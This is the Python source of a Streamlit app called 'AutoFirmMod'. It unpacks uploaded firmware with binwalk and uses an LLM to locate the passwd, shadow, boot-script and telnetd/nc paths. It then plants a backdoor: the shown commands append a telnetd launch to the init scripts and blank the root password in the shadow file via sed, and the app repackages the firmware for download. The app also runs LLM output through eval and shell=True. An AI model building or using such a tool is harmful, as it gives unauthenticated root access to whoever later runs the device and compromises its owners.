import streamlit as st
import os
import uuid
import subprocess
from dotenv import load_dotenv
from llm import get_llm_response
import json

load_dotenv()
UPLOAD_DIR = "upload"
os.makedirs(UPLOAD_DIR, exist_ok=True)


def save_uploaded_file(upload_file, user_id):
    user_dir = os.path.join(UPLOAD_DIR, user_id)
    os.makedirs(user_dir, exist_ok=True)
    save_path = os.path.join(user_dir, upload_file.name)
    with open(save_path, "wb") as f:
        f.write(upload_file.getbuffer())
    return save_path, user_dir


def run_binwalk(save_path, log_path):
    with open(log_path, "w") as log_file:
        subprocess.run(["binwalk", save_path], stdout=log_file, stderr=log_file)


def dump_fs(file_path, output_path, offset, size=None):
    command = [
        "dd",
        f"if={file_path}",
        f"of={output_path}",
        "bs=1",
        f"skip={offset}"
    ]
    if size is not None:
        command.append(f"count={size}")
    subprocess.run(command, check=True)


def extract_squashfs(squashfs_path, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    subprocess.run(["unsquashfs", "-f", "-d", output_dir, squashfs_path], check=True)
    return


def extract_jffs2(jffs2_path, output_dir):
    subprocess.run(["jefferson", "-d", output_dir, jffs2_path], check=True)
    return


def directory_clean(path):
    if os.path.exists(path):
        subprocess.run(["rm", "-rf", path], check=True)


def directory_tree(user_dir, save_dir):
    with open(save_dir, "w") as save_dir:
        subprocess.run(
            f"tree {user_dir}/rootfs| sed 's|{user_dir.replace("/", "\\/")}/||'",
            shell=True, stdout=save_dir, stderr=save_dir
        )


def button_click_callback(key):
    st.session_state.button_clicked = key


def check_missing_files(file_path):
    if not os.path.exists(file_path): 
        return False
    return True


def read_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()        
    except FileNotFoundError:
        st.error("The specified file was not found.")
    except Exception as e:
        st.error(f"An error occurred: {e}") 
    return file_data


def overwrite_file(src_path, start_byte, end_byte, dst_path):
    try:
        if end_byte == None:
            end_byte = len(dst_path)
        overwrite_length_check = end_byte - start_byte
        with open(src_path, 'rb') as source_file:
            src_data = source_file.read()
        overwrite_length = len(src_data)
        if overwrite_length < overwrite_length_check:
            print('The size of the filesystem to be overwritten is larger than the existing filesystem.')
        length = min(overwrite_length, overwrite_length_check)
        with open(dst_path, 'rb+') as target_file:
            target_file.seek(start_byte)
            target_file.write(src_data[:length])

        print(f"Successfully overwritten {length} bytes from {src_path} "
              f"to {dst_path} from byte {start_byte} to {start_byte + length}.")
    except FileNotFoundError as e:
        print(f"File not found: {e.filename}")
    except Exception as e:
        print(f"An error occurred: {e}")


# Streamlit Main
st.title("AutoFirmMod")
st.markdown("""
        <style>
        .button-container {
            display: flex;
            justify-content: center;
            width: 100%;
        }
        .stButton button {
            width: 100px; 
        }
        </style>
    """, unsafe_allow_html=True)

default_states = {
    "button_clicked": None,
    "file_paths_json1": None,
    "file_paths_json2": None,
    "user_dir": None,
    "upload_file_name": None,
    "squashfs_lines": None,
    "jffs2_lines": None,
    "shadow_path": None,
}

for key, default_value in default_states.items():
    if key not in st.session_state:
        st.session_state[key] = default_value

if st.session_state.button_clicked is None:
    upload_file = st.file_uploader("Please upload your firmware", type=["bin"])
    if upload_file is not None:
        st.session_state.upload_file_name = upload_file.name
        user_id = str(uuid.uuid4())
        directory_clean(f'{UPLOAD_DIR}/{user_id}')
        save_path, user_dir = save_uploaded_file(upload_file, user_id)
        st.session_state.user_dir = user_dir
        log_path = os.path.join(user_dir, "binwalk_log.txt")
        run_binwalk(save_path, log_path)
        
        st.success(f"File saved successfully : {upload_file.name}")
        st.success(f"Running Binwalk on uploaded file...")

        squashfs_lines = []
        with open(log_path, "r") as f:
            lines = f.readlines() 

            for i, line in enumerate(lines):
                if "squashfs" in line.lower():
                    current_line = line.strip().split()
                    squashfs_lines.append(current_line) 
                    if i + 1 < len(lines) and "squashfs" not in lines[i + 1].lower():
                        next_line = lines[i + 1].strip().split()
                        squashfs_lines.append(next_line)
        
        jffs2_lines = []
        jffs2_list = ["zlib", "lzo", "rtime"]
        with open(log_path, "r") as f:
            lines = f.readlines()
            skip = False

            for i, line in enumerate(lines):
                if "jffs2" in line.lower():
                    current_line = line.strip().split()
                    jffs2_lines.append(current_line) 
                    skip = True 

                elif skip: 
                    lower_line = line.lower()
                    if any(keyword in lower_line for keyword in jffs2_list):
                        continue
                    else:
                        next_line = line.strip().split()
                        jffs2_lines.append(next_line)
                        skip = False

                if i == len(lines) - 1 and skip: 
                    jffs2_lines.append([]) 
                    skip = False 
        st.session_state.squashfs_lines = squashfs_lines
        st.session_state.jffs2_lines = jffs2_lines
        
        if not squashfs_lines:
            st.info("squashfs Filesystem not found.")
        else: 
            cnt = 0
            for i in range(len(squashfs_lines)):
                if squashfs_lines[i] and squashfs_lines[i][2].lower() == 'squashfs':
                    offset = int(squashfs_lines[i][0])
                    if not squashfs_lines[i+1]:
                        size = None
                    else:
                        size = int(squashfs_lines[i+1][0]) - int(squashfs_lines[i][0])
                    output_path = user_dir+f'/squashfs{cnt}.bin'
                    dump_fs(save_path, output_path, offset, size)  
                    cnt += 1
            os.makedirs(f'{user_dir}/rootfs', exist_ok=True) 
            extracted_squahfs= []
            for i in range(cnt):
                input_squashfs = f'{user_dir}/squashfs{i}.bin'
                output_dir = f'{user_dir}/rootfs/squashfs-root-{i}'
                extract_squashfs(input_squashfs, output_dir)
                extracted_squahfs.append(f"squashfs-root-{i}")
            st.success(f"Filesystem extraction completed : {', '.join(extracted_squahfs)}")

            cnt = 0
            os.makedirs(f'{user_dir}/jffs2', exist_ok=True) 
            for i in range(len(jffs2_lines)):
                if jffs2_lines[i] and jffs2_lines[i][2].lower() == 'jffs2':
                    offset = int(jffs2_lines[i][0])
                    if not jffs2_lines[i+1]:
                        size = None
                    else:
                        size = int(jffs2_lines[i+1][0]) - int(jffs2_lines[i][0])
                    output_path = user_dir+f'/jffs2/jffs2-{cnt}.bin'
                    dump_fs(save_path, output_path, offset, size)  
                    cnt += 1
            
            extracted_jffs2 = []
            for i in range(cnt):
                input_jffs2 = f'{user_dir}/jffs2/jffs2-{i}.bin'
                output_dir = f'{user_dir}/jffs2/jffs2-{i}'
                extract_jffs2(input_jffs2, output_dir)
                extracted_jffs2.append(f"jffs2-{i}")
            st.success(f"Filesystem extraction completed : {', '.join(extracted_jffs2)}")

            directory_tree(f'{user_dir}', f'{user_dir}/tree')

            file_paths = get_llm_response(1, f'{user_dir}/tree')
            file_paths_json1 = json.loads(file_paths)
            st.session_state.file_paths_json1 = file_paths_json1

            boot_scripts = file_paths_json1['boot_scripts']
            mount_info = {}
            for path in boot_scripts:
                try:
                    result = subprocess.run(
                        f"grep -r mount {user_dir}/{path}",
                        shell=True,
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    mount_info[path] = result.stdout.strip().split("\n")
                except subprocess.CalledProcessError as e:
                    if e.returncode == 1: 
                        mount_info[path] = []
                    else:
                        print(f"Error processing file {path}: {e.stderr}")
            print(f'mount info : {mount_info}')
            check_file_dic = file_paths_json1.copy()
            del check_file_dic["boot_scripts"]
            
            if check_missing_files(file_paths_json1["shadow"]):
                st.session_state.shadow_path = get_llm_response(4, None, mount_info, None, None, file_paths_json1["shadow"])

            #file_paths_json1 = {"passwd":"rootfs/squashfs-root-0/etc/config/passwd","shadow":"rootfs/squashfs-root-0/etc/config/shadow","boot_scripts":["rootfs/squashfs-root-0/etc/init.d/rc.local","rootfs/squashfs-root-0/etc/init.d/rcS"]}
            #file_paths_json1 = {"passwd":"rootfs/squashfs-root-0/etc/passwd", "shadow":"rootfs/squashfs-root-0/etc/shadow", "boot_script":"rootfs/squashfs-root-0/etc/init.d/rcS"}
            st.markdown("---")
            st.write("### boot script & passwd")
            st.write(file_paths_json1)
            if st.session_state.shadow_path:
                st.warning("Shadow file could not be found.")
                st.info(f"The actual path of the shadow file: {st.session_state.shadow_path}")
                st.success(f"Shadow file path update completed.")
            st.markdown("---")
            file_paths = get_llm_response(2, f'{user_dir}/tree')
            file_paths_json2 = json.loads(file_paths)
            #file_paths_json2 = {"telnetd":"rootfs/squashfs-root-1/sbin/telnetd","nc":"rootfs/squashfs-root-1/bin/nc","socat":None,"busybox":None}
            #file_paths_json2 = {"telnetd":"rootfs/squashfs-root-0/sbin", "nc":"rootfs/squashfs-root-0/bin", "socat":None, "busybox":"rootfs/squashfs-root-0/bin"}
            st.session_state.file_paths_json2 = file_paths_json2
            st.write("### Backdoor Point List")
            st.write(file_paths_json2)
            st.markdown("---")

            st.write("### Select Backdoor Type")
            columns = st.columns(4) 
            for idx, (key, path) in enumerate(file_paths_json2.items()):
                with columns[idx]:
                    st.markdown('<div class="button-container">', unsafe_allow_html=True)
                    if path is None:
                        st.button(f"{key}", key=f"{key}_disabled", disabled=True, help="Not Available")
                    else:
                        st.button(
                            f"{key}", 
                            key=f"{key}_enabled", 
                            disabled=False, 
                            help="Available",
                            on_click=button_click_callback,
                            args=(key,) 
                        )
                    st.markdown('</div>', unsafe_allow_html=True)
                

if st.session_state.get("button_clicked"):
    st.markdown(f"### Backdoor Type : {st.session_state.button_clicked}")
    setting_path = st.session_state.file_paths_json1
    binary_path = st.session_state.file_paths_json2
    user_dir = st.session_state.user_dir
    if st.session_state.button_clicked == "telnetd":
        print(f'setting_path : {setting_path}')
        print(f'binary_path : {binary_path}')
        print(f'user_dir : {user_dir}')
        commands = get_llm_response(3, None, setting_path, binary_path, user_dir)
        print(f'user_dir : {commands}')
        commands = eval(commands)
        #commands = [f"echo '/sbin/telnetd &' >> {user_dir}/rootfs/squashfs-root-0/etc/init.d/rcS", f"sed -i 's/^root:[^:]*:/root::/' {user_dir}/rootfs/squashfs-root-0/etc/shadow"]
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, check=True)  
            except subprocess.CalledProcessError as e:
                pass
        if st.session_state.shadow_path:
            for boot_script in setting_path['boot_scripts']:
                cmd = f"""echo "sed -i 's/^root:[^:]*:/root::/' {st.session_state.shadow_path}" >> {user_dir}/{boot_script}"""
                subprocess.run(cmd, shell=True, check=True) 
        st.success(f'Filesystem modification complete!')
    elif st.session_state.button_clicked == "nc":
        st.code(f"setting_path: {setting_path}")
        st.code(f"binary_path: {binary_path}")
        st.warning(f"The selected backdoor type '{st.session_state.button_clicked}' is not yet implemented.")
        st.stop()
    elif st.session_state.button_clicked == "socat":
        st.code(f"setting_path: {setting_path}")
        st.code(f"binary_path: {binary_path}")
        st.warning(f"The selected backdoor type '{st.session_state.button_clicked}' is not yet implemented.")
        st.stop()
    elif st.session_state.button_clicked == "busybox":
        st.code(f"setting_path: {setting_path}")
        st.code(f"binary_path: {binary_path}")
        st.warning(f"The selected backdoor type '{st.session_state.button_clicked}' is not yet implemented.")
        st.stop()
    
    cmd = f"find {user_dir}/rootfs/* -type f -mtime -1"
    result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
    lines = result.stdout.splitlines()
    print(lines)
    modified_fs = set()
    for line in lines:
        word = line.split('/')
        modified_fs.add(word[3])
    st.success(f'Repackaging modified filesystem : {', '.join(modified_fs)}')
    for fs_path in modified_fs:
        cmd = ["mksquashfs", f"{user_dir}/rootfs/{fs_path}", f"{user_dir}/{fs_path}-patched", "-comp", "xz"]
        try:
            result = subprocess.run(cmd, check=True, capture_output=True, text=True)
            print("Command executed successfully:")
            print(result.stdout) 
        except subprocess.CalledProcessError as e:
            print("Command failed with error:")
            print(e.stderr)
    
    file_path_src = f"{user_dir}/{st.session_state.upload_file_name}"
    file_path_dst = f"{user_dir}/{st.session_state.upload_file_name.split('.')[0]}-modified.bin"
    subprocess.run(["cp", file_path_src, file_path_dst], check=True)
    squashfs_lines = st.session_state.squashfs_lines
    fs_size = {}
    cnt = 0
    for i in range(len(squashfs_lines)):
        if squashfs_lines[i] and squashfs_lines[i][2].lower() == 'squashfs':
            start_byte = int(squashfs_lines[i][0])
            if not squashfs_lines[i+1]:
                end_byte = None
            else:
                end_byte = int(squashfs_lines[i+1][0])
            fs_size[f"squashfs-root-{cnt}"] = [start_byte, end_byte]
            cnt += 1
    print(f'modified_fs : {modified_fs}')
    print(f'fs_size : {fs_size}')
    for fs_path in modified_fs:
        src_path = f"{user_dir}/{fs_path}-patched"
        start_byte, end_byte = fs_size[f'squashfs-root-{fs_path[-1]}']
        overwrite_file(src_path, start_byte, end_byte, file_path_dst)
    file_name = file_path_dst.split("/")[-1] 
    file_data = read_file(file_path_dst)
    st.write("### Download Modified Firmware")
    st.write('Please click the download link below to download the modified firmware.')
    st.write('To modify a new firmware file, please refresh the page.')
    st.download_button(
            label=f"Download",
            data=file_data,
            file_name=file_name,
            mime="application/octet-stream",
    )

